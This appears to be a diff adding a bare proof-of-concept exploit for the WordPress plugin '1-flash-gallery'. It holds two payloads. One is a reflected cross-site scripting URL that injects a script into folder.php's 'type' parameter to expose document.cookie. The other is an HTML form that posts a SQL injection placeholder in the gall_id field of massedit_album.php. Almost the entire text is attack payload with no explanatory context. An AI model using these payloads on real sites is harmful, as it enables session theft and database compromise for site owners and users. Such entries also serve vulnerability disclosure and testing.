@@ -1,0 +1,7 @@
+http://www.example.com/wp-content/plugins/1-flash-gallery/folder.php?type=%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+&lt;form action=&quot;http://[host]/wp-content/plugins/1-flash-gallery/massedit_album.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;album_id&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;images&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;gall_id&quot; value=&quot;SQL_CODE_HERE&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot; /&gt;
